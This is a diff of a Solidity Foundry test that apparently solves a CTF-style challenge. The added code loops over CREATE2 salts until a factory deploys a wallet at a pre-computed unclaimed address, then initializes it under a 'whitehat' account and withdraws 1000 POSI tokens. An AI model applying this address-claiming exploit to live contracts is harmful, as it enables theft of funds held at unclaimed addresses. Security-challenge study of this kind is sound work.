@@ -48,7 +48,28 @@ contract Challenge4Test is Test {
         ////////////////////////////////////////////////////*/
 
 
+        //This is inefficient AF Don't try this at home kids
+        bool success = false;
+        uint256 saltyMcSaltface = 0;
+        address payable newWallet;
 
+        //Get the bytecode of the wallet template
+        bytes memory code = type(VaultWalletTemplate).creationCode;
+
+        //Generate new wallets until the address matches the unclaimed address
+        while (!success)
+        {
+            newWallet = payable(FACTORY.deploy(code, saltyMcSaltface));
+            success = newWallet == unclaimedAddress;
+            saltyMcSaltface += 1;
+        }
+
+        //Initialize the wallet
+        VaultWalletTemplate walletWeWant = VaultWalletTemplate(newWallet);
+        walletWeWant.initialize(whitehat);
+
+        //Withdraw the funds to the devs
+        walletWeWant.withdrawERC20(address(POSI), 1000 ether, devs);
 
         //==================================================//
         vm.stopPrank();
